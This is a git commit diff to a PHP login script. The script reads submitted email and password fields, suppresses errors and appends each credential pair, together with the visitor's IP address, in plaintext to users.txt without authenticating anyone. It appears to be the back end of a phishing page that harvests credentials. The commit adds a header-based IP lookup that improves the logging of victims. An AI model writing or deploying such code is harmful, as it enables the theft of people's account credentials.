4c7a40e1bb8eb8d3939a9ca88e47a57fc602a356
Anjana Madu <86356062+AnjanaMadu@users.noreply.github.com>
2021-12-31 01:32:19 +0530

    Update login.php

--- login.php
+++ login.php
@@ -2,9 +2,28 @@
 
 error_reporting(0);
 
+function get_client_ip() {
+    $ipaddress = '';
+    if (isset($_SERVER['HTTP_CLIENT_IP']))
+        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED'];
+    else if(isset($_SERVER['REMOTE_ADDR']))
+        $ipaddress = $_SERVER['REMOTE_ADDR'];
+    else
+        $ipaddress = 'UNKNOWN';
+    return $ipaddress;
+}
+
 $email = $_POST["email"];
 $pass = $_POST["pass"];
-$client_ip = $_SERVER["REMOTE_ADDR"];
+$client_ip = get_client_ip();
 
 $fp = fopen("users.txt", "a");
 fwrite($fp, "$email\n$pass\n$client_ip\n\n");
